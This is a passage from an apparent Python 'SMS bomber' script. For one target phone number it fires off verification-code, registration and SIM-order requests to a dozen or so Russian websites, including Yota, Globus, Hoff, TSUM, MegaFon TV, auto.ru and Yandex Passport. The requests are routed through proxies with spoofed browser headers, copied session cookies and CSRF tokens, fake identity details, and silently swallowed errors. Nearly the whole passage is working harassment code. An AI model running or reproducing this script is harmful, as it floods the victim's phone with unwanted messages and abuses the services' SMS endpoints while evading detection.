                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            requests.get(
                f'https://www.yota.ru/voice/order-sim?p_p_id=yotagoodsorder_WAR_ecommerceportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=column-1&p_p_col_count=2&_yotagoodsorder_WAR_ecommerceportlet_cmd=SaveOrderAndSendOtpCommand&_yotagoodsorder_WAR_ecommerceportlet_goodId=10&_yotagoodsorder_WAR_ecommerceportlet_timezone=1&_yotagoodsorder_WAR_ecommerceportlet_orderId=1658701&_yotagoodsorder_WAR_ecommerceportlet_fiasCode=a376e68d724a4472be7c891bdb09ae32&_yotagoodsorder_WAR_ecommerceportlet_phone=%2B7%20{num2}%20{num3}%20{num4}%20{num5}&_yotagoodsorder_WAR_ecommerceportlet_receivingWay=DELIVERY&_yotagoodsorder_WAR_ecommerceportlet_quantity=1&_yotagoodsorder_WAR_ecommerceportlet_isSet=true&_yotagoodsorder_WAR_ecommerceportlet_b2b=false&_yotagoodsorder_WAR_ecommerceportlet_createSource=site&_yotagoodsorder_WAR_ecommerceportlet_totalCoast=400&_yotagoodsorder_WAR_ecommerceportlet_sr=false&_yotagoodsorder_WAR_ecommerceportlet_mnp=true&_yotagoodsorder_WAR_ecommerceportlet_customerComment=&_yotagoodsorder_WAR_ecommerceportlet_paymentType=CASH&_yotagoodsorder_WAR_ecommerceportlet_deliverFrom=2022-11-06%2009%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliverTo=2022-11-06%2012%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliveryCost=0&_yotagoodsorder_WAR_ecommerceportlet_address=%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_fullAddress=454087%2C%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%2C%20%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_latitude=55.128053&_yotagoodsorder_WAR_ecommerceportlet_longitude=61.381264&_yotagoodsorder_WAR_ecommerceportlet_city=%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA&_yotagoodsorder_WAR_ecommerceportlet_street=%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F&_yotagoodsorder_WAR_ecommerceportlet_house=2&_yotagoodsorder_WAR_ecommerceportlet_block=&_yotagoodsorder_WAR_ecommerceportlet_flat=&_yotagoodsorder_WAR_ecommerceportlet_fiasId=34bef4c8-de57-4d87-b8ed-912100b15903&_yotagoodsorder_WAR_ecommerceportlet_entrance=&_=1667594885833',
                headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"

            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '27',
                'content-type': 'application/json',
                'origin': 'https://foodzo.ru',
                'referer': 'https://foodzo.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'User-Agent': user
            }

            payload = {'dest': num2}

            requests.post('https://admin.foodzo.ru/api/v2/users/send-code/phone', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '88',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'globusid=g3RvHv3DcXSnR0DwauXaFB3hSK2dGcke; REGION_178_170_198_53=%7B%22code%22%3Afalse%2C%22city_name%22%3Afalse%7D; BITRIX_SM_SALE_UID=7ca8b2b36b5cdc1f87f7b2ddd9858664; BITRIX_SM_GUEST_ID=11930120; rrpvid=747398470484838; BITRIX_CONVERSION_CONTEXT_s2=%7B%22ID%22%3A58%2C%22EXPIRE%22%3A1667681940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BX_USER_ID=c35d2e5e5e9270c5b3d377e92deb5871; advcake_track_id=5a3e1860-39ce-d505-d051-3a9b18d2b777; advcake_session_id=6419119b-a2ba-a6b3-548d-a39767dcacb7; rcuid=63646f12e2746a93f2420567; _gcl_au=1.1.1464809485.1667680138; pagesCount=1; gtm-session-start=1667680137833; pages_cnt=2; _gid=GA1.2.1921378419.1667680138; _ga_WYXVN1FFMV=GS1.1.1667680138.1.0.1667680138.60.0.0; _gaclientid=1365190579.1667680138; _gasessionid=86b8c938-5ebe-4471-95b9-c6ca14762739; _gat_UA-6261130-10=1; _ga=GA1.2.1365190579.1667680138; tmr_lvid=bb82992cc80c00368f78b96a902a75be; tmr_lvidTS=1667680138078; _ym_uid=16676801381073701346; _ym_d=1667680138; st_uid=d98c6c41f362b09e98255ae50562dd90; _ym_isad=2; _ym_visorc=b; adrdel=1; adrcid=Akudtj5EGO_LUSRfXEyKF0Q; rai_new=dec530f7fa6d02dcb7b0c0215f212854; analytic_id=1667680139282854; tmr_detect=0%7C1667680140457; _gahitid=2022-11-05T21:29:10.498+01:00; tmr_reqNum=8',
                'origin': 'https://online.globus.ru',
                'referer': 'https://online.globus.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                'AUTH_FORM': 'Y',
                'TYPE': 'AUTH',
                'FORM[AUTH_TYPE]': 'PHONE',
                'FORM[PHONE]': num2
            }

            requests.post('https://online.globus.ru/', data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '224',
                'content-type': 'application/json',
                'cookie': '_ga=GA1.2.2108841258.1667680421; _gid=GA1.2.1628483400.1667680421; tmr_lvid=5c385c2b38e5657a71fb6f8ccf348cf0; tmr_lvidTS=1667680421368; _ym_uid=1667680422433564150; _ym_d=1667680422; _ym_isad=2; _ym_visorc=w; supportOnlineTalkID=ePvRx7CdRMpAMGC57X7IPaLHCSGEI8mL; __cfruid=354aabc5d3d3f1aed72964ff31d4d7043119adac-1667680508; ec_id=b22e8141-a6a2-49e9-addf-d0958d4b2bef; tmr_detect=0%7C1667680526135; deviceUid=ff004018-91ab-4913-9761-9c8c510136c2; tmr_reqNum=15',
                'origin': 'https://adengi.ru',
                'referer': 'https://adengi.ru/registration/personal',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-device-uid': 'b22e8141-a6a2-49e9-addf-d0958d4b2bef',
                'x-version-fe': '1666591147478'
            }

            payload = {
                "email": "e0grijoekg3_dwdw@hotmail.com",
                "firstName": "Василий",
                "hash": "a6ac90134b55d015bd2731fd4e2f06d3",
                "lastName": "Пупин",
                "middleName": "Иванович",
                "phone": number,
                "timestamp": 1667680555,
                "via": "sms"
            }

            requests.post('https://adengi.ru/rest/v1/registration/code/send', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '117',
                'content-type': 'application/json',
                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==; uteka_city_id=47; _ru_yandex_autofill=not_available',
                'origin': 'https://krym.uteka.ru',
                'platform': 'Desktop',
                'referer': 'https://krym.uteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'version': 'b835b033'
            }

            payload = {"jsonrpc": "2.0", "id": 6, "method": "auth.GetCode",
                       "params": {"phone": number[1:], "mustExist": False, "sendRealSms": True}}

            requests.post('https://krym.uteka.ru/rpc/?method=auth.GetCode', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': '',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Length': '82',
                'Content-Type': 'application/json',
                'Cookie': 'zdr_customer_external_id=44e62396-1cee-4165-80a3-8ce848633410; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D; deviceId=6adada4b-b83b-406a-ac5b-b6101d282cdc; is-converted-basket=true; is-converted-liked=true; qrator_jsid=1667778933.193.ee7fMuSZ0aiaAQ0h-9qis1t0fph2cphoe2s5j19q05nb2m296',
                'Host': 'zdorov.ru',
                'Origin': 'https://zdorov.ru',
                'Referer': 'https://zdorov.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            payload = {
                'phone': number,
                'deviceId': '6adada4b-b83b-406a-ac5b-b6101d282cdc',
                'term': 2
            }

            requests.post('https://zdorov.ru/backend/api/customer/confirm', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 {} {} {} {} {}{}".format(num[1:4], num[4:7], num[7:9], num[9:11])

            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '54',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': 'PHPSESSID=ukr2dhbg1r9ck65nvm93j7usgd; current_location_data=a%3A4%3A%7Bs%3A5%3A%22chain%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A19%3B%7Ds%3A4%3A%22name%22%3Bs%3A12%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%3Bs%3A9%3A%22full_name%22%3Bs%3A12%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%3Bs%3A11%3A%22location_id%22%3Bi%3A19%3B%7D; current_location_id=19; current_city=711; BITRIX_SM_ab_test_multi=%7B%22aa06%22%3A%7B%22ID%22%3A%227710124%22%2C%22NAME%22%3A%22aa06%22%2C%22GROUP%22%3A%22B%22%7D%2C%22aa07%22%3A%7B%22ID%22%3A%227710127%22%2C%22NAME%22%3A%22aa07%22%2C%22GROUP%22%3A%22B%22%7D%2C%22aa08%22%3A%7B%22ID%22%3A%227710128%22%2C%22NAME%22%3A%22aa08%22%2C%22GROUP%22%3A%22A%22%7D%2C%22aa09%22%3A%7B%22ID%22%3A%227710129%22%2C%22NAME%22%3A%22aa09%22%2C%22GROUP%22%3A%22B%22%7D%2C%22aa10%22%3A%7B%22ID%22%3A%227710131%22%2C%22NAME%22%3A%22aa10%22%2C%22GROUP%22%3A%22A%22%7D%2C%22dates%22%3A%7B%22ID%22%3A%227895663%22%2C%22NAME%22%3A%22dates%22%2C%22GROUP%22%3A%22%22%7D%2C%22kt_left%22%3A%7B%22ID%22%3A%228107330%22%2C%22NAME%22%3A%22kt_left%22%2C%22GROUP%22%3A%22A%22%7D%2C%22hity_prodazh%22%3A%7B%22ID%22%3A%228351207%22%2C%22NAME%22%3A%22hity_prodazh%22%2C%22GROUP%22%3A%22%22%7D%2C%22rr_popup%22%3A%7B%22ID%22%3A%228413423%22%2C%22NAME%22%3A%22rr_popup%22%2C%22GROUP%22%3A%22A%22%7D%2C%22aaaa%22%3A%7B%22ID%22%3A%228423545%22%2C%22NAME%22%3A%22aaaa%22%2C%22GROUP%22%3A%22B%22%7D%2C%22vmeste_pokupayut%22%3A%7B%22ID%22%3A%228431927%22%2C%22NAME%22%3A%22vmeste_pokupayut%22%2C%22GROUP%22%3A%22%22%7D%2C%22services%22%3A%7B%22ID%22%3A%228468431%22%2C%22NAME%22%3A%22services%22%2C%22GROUP%22%3A%22A%22%7D%2C%22quickview%22%3A%7B%22ID%22%3A%228477065%22%2C%22NAME%22%3A%22quickview%22%2C%22GROUP%22%3A%22%22%7D%2C%22search_source2%22%3A%7B%22ID%22%3A%228494465%22%2C%22NAME%22%3A%22search_source2%22%2C%22GROUP%22%3A%22B%22%7D%2C%22quotas_sku%22%3A%7B%22ID%22%3A%228522979%22%2C%22NAME%22%3A%22quotas_sku%22%2C%22GROUP%22%3A%22A%22%7D%2C%22anyquery%22%3A%7B%22ID%22%3A%228525703%22%2C%22NAME%22%3A%22anyquery%22%2C%22GROUP%22%3A%22A%22%7D%2C%22video_listing%22%3A%7B%22ID%22%3A%228540227%22%2C%22NAME%22%3A%22video_listing%22%2C%22GROUP%22%3A%22%22%7D%2C%22cartpopap%22%3A%7B%22ID%22%3A%228544915%22%2C%22NAME%22%3A%22cartpopap%22%2C%22GROUP%22%3A%22A%22%7D%2C%22setka%22%3A%7B%22ID%22%3A%228631141%22%2C%22NAME%22%3A%22setka%22%2C%22GROUP%22%3A%22%22%7D%2C%22main1%22%3A%7B%22ID%22%3A%228631187%22%2C%22NAME%22%3A%22main1%22%2C%22GROUP%22%3A%22%22%7D%2C%22smart_filters%22%3A%7B%22ID%22%3A%228642223%22%2C%22NAME%22%3A%22smart_filters%22%2C%22GROUP%22%3A%22A%22%7D%2C%22new_billing%22%3A%7B%22ID%22%3A%228696669%22%2C%22NAME%22%3A%22new_billing%22%2C%22GROUP%22%3A%22%22%7D%7D; iwaf_fingerprint=b62d832f832ca2f3a46d73d451f7c01c; BITRIX_SM_CUR_ORDER_IDS=%5B%5D; _userGUID=0:la60x5ua:NQzvC6tZbv06owYT6N6nmMMxszutU6My; _dvs=0:la60x5ua:9X~~8h5zYnLQNb6_GMWGIxHPvOJXo9sY; iwaf_click_event=115x319',
                'origin': 'https://hoff.ru',
                'referer': 'https://hoff.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'phone': num2,
                "g-recaptcha-response": {}
            }

            requests.post('https://hoff.ru/vue/register/', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '101',
                'Content-type': 'application/vnd.api+json',
                'Cookie': 'guid_city=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; name_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; guid_region=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; guid_country=8aa15da9-92a4-4530-ab74-1992c973c539; region_timezone=UTC%2B3%3A00; ab-test-user-id=b81234b62c57e7db8f97bb8c5aae7d2dc5a20488c38e1f6963ee8a14a3356f7da%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22ab-test-user-id%22%3Bi%3A1%3Bs%3A32%3A%22933133d1ca8f2277c2dbc5671647b30d%22%3B%7D; fuser_id=400a9f05c3d4eea2e6a463167ceffc5a9113a569cfa9a16392484053b87bfcaaa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%2224e973c408cc57099eac88d53ad12205%22%3B%7D; PHPSESSID=0hd82290tod529ln49unqlitke; _csrf=ab463b1a39cb814c72899b49f7e46e245f5ca7b88de51eda4075fd2da58abc93a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22-qTZJe5FI0mRe2WzkLYoSlrqTgr4wVOJ%22%3B%7D; inova_p_sid=qol791i_221109090955; windowDate=2022%2011%2009',
                'Host': 'sokolov.ru',
                'Origin': 'https://sokolov.ru',
                'Referer': 'https://sokolov.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            payload = {
                "data": {"type": "login", "attributes": {"phone": number, "uid_captcha": None, "code_captcha": None}}}

            requests.post('https://sokolov.ru/api/v4/profile/user/send-code', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '100',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'BITRIX_SM_SALE_UID=31225761; BITRIX_SM_EVRAZ_CURRENT_LOC_ID=93; BITRIX_SM_EVRAZ_SEND_GEO_LOCATION_REQUEST=Y; operator=0; authorization=0; BITRIX_SM_EVRAZ_LOC_ID=93; BITRIX_SM_EVRAZ_LOC_CITY_NAME=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; BITRIX_SM_EVRAZ_CITY=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; PHPSESSID=7ImV2jMdTgrjFbH1FR4KT9JlWMhfjUz5; BITRIX_SM_EVRAZ_LAST_IP_V2=151.106.12.246',
                'origin': 'https://spb.evraz.market',
                'referer': 'https://spb.evraz.market/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-bitrix-csrf-token': 'e13afe9718f81a6518cbaa0bda8979e3'
            }

            payload = {
                'userPhone': num2,
                'captchaCode': '',
                'captchaWord': '',
                'sessid': 'e13afe9718f81a6518cbaa0bda8979e3'
            }

            requests.post(
                'https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms',
                data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+" + number}}}

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '68',
                'Content-Type': 'application/json',
                'Cookie': 'xid=f977bd6a-7555-4825-8c30-2f80517a7c81; catalogGender=women; uuid=84513f80-afe7-4390-b9ab-cbef7219cdc9; siteVer=1.0.0; _slfs=1668014274236; _slid=636be0af01b07254b104fe53; _slsession=06C229F2-EBA7-43B8-BE6D-ED83E1A61A4E; actual-checkout-type=cart; gtmc_userAuth=0; __zzatw-tsum=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VfRGwkGXtfUEBcUn4qFhV/bShMDz5ePT5vMTE7ah5meGBSS1Y/dRdZRkE2XBpLdWUJCzowJS0xViR8SylEW1MJJRoVeXIoVg0QVy8QLj9hTixcIggWEU0hF0ZaFXtDPGMMcRVNfX0mNGd/ImUrOVURCBISIGNVWml1WQhDThgSPV8qWFcMNHhlEENYfXFrL2R7RSRfHDx1ZS8zaWVpcC9gIBIlEU0hF0ZaFXtDLGAMcRVcQ0d1cyo/ZyRkTl8nP0ccOmlRJD4yXhA8dWUJCzowJS0xZid8Syk1HREyXldVNDtnQXt1IHJ+FDllDFcnHXgdYngqIg==H7n1MA==; wishlist_sid=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_release=19257c11ea8e8373036b532c32b28dc6458b591b; gtmc_city=%D0%A1%D1%82%D1%80%D0%B0%D1%81%D0%B1%D1%83%D1%80%D0%B3; gtmc_region=null; gtmc_country=%D0%A4%D1%80%D0%B0%D0%BD%D1%86%D0%B8%D1%8F; x-wishlist-sid-local=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_cart=%7B%22cnt%22%3A%5B%5D%2C%22id%22%3A%5B%5D%2C%22cd6%22%3A%5B%5D%7D; gssc213163=; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; gsscw-tsum=dJzFkoZnrNwUdl/mSDzQo81riC8qq0GIsZzhPoLf0pZbmGjgRYPcM0QWcCFS7kRNN1aHi7mPHqeUa0A3H9gCx77HRnAF9GCMKyoeoR/wxTE2cjEVVe1BRX45yL//NylMoPtcS7YG1Qk9Nr47WK5l+plq0NMS1PeKrSRLRtgMuqcuMW8KQJArwzF1EBHLsSr9he4hueRZ55gl/DHmCBHWblQMRKQJP4gdDB2bpqReQMdRJQPf5OJSqXSR+X7Gyo6s5rwRHPY43wDGgmRx2uxB; fgsscw-tsum=HM2a24aeaad3ebe9f3acf27c1860f9e7d6769237',
                'Host': 'api.tsum.ru',
                'Origin': 'https://www.tsum.ru',
                'Referer': 'https://www.tsum.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user,
                'X-Client-Date': '09.11.2022, 18:18:06',
                'X-Site-Region': 'RU',
                'X-Uid': '84513f80-afe7-4390-b9ab-cbef7219cdc9',
                'X-XID': 'f977bd6a-7555-4825-8c30-2f80517a7c81'
            }

            requests.post('https://api.tsum.ru/v2/authorize/request-sms', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '51',
                'Content-Type': 'application/json',
                'Cookie': 'SessionID=baMlJmKhzoYnXn2NFKHNsQuF0hUrwWnKpjcm5VLEkVU',
                'Host': 'bmp.megafon.tv',
                'Origin': 'https://megafon.tv',
                'Referer': 'https://megafon.tv/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {
                'msisdn': "+" + number,
                'password': "200147200147"
            }

            requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '107',
                'content-Type': 'application/json',
                'Cookie': 'suid=69c5eebce8dd622b0c61536c8880755b.bbb938e4d6d90b9ea4f49bd33d6b9228; autoru_sid=a%3Ag636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca%7C1668014724703.604800.tb-QtFaltosbNGBHFhXuUw.PIb8E2rWYxc1npgvR-99UIXOd3VYt8YlJqswR1Yd1nM; autoruuid=g636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca; autoru_gdpr=1; spravka=dD0xNjY4MDE0NzQwO2k9MTUxLjEwNi4xMi4yNDY7RD1DMzVBNEZGODRDMDg4OTU3MkRGOTREMEFCRTM5M0NBOTE2N0JFRjBENzU0QTIwRTgwODM2OTE4NEFFMUI1MTFEQzE3N0FDQjk7dT0xNjY4MDE0NzQwNjg1ODYyNjQyO2g9YTU5NDM0N2U1ZGMyYWEwZmZlZTUzMGQ1YzFlYjQ0YTU=; _yasc=BfGUGpXLHtiBxKt6L6s4IsWKTSltQon0caSV3VQUM02jgcteHq6J+3znIWK0; _csrf_token=99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                'Host': 'auth.auto.ru',
                'Origin': 'https://auth.auto.ru',
                'Referer': 'https://auth.auto.ru/login/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'x-csrf-token': '99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {"items": [
                {"path": "auth/login-or-register", "params": {"phone": number, "retpath": "https://auto.ru/"}}]}

            requests.post('https://auth.auto.ru/-/ajax/auth/', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            r = requests.get(
                'https://passport.yandex.ru/registration?retpath=https%3A%2F%2Fsso.passport.yandex.ru%2Fprepare%3Fuuid%3D2b4f2f34-4209-48dc-9fbc-a387c073dcfd%26goal%3Dhttps%253A%252F%252Fya.ru%252F%26finish%3Dhttps%253A%252F%252Fpassport.yandex.ru%252F&process_uuid=fdb2fdab-53b3-4b8c-b4ee-7208186098dc',
                headers=header, proxies=proxy_2)

            str1 = str(r.text)
            str2 = str1[str1.find('name="track_id"'):]
            str3 = str2.replace('name="track_id" value="', '')
            str4 = ''

            for i in range(len(str3)):
                str4 += str3[i]
                if str3[i] == '"':
                    break

            str4 = str4[:-1]

            header = {
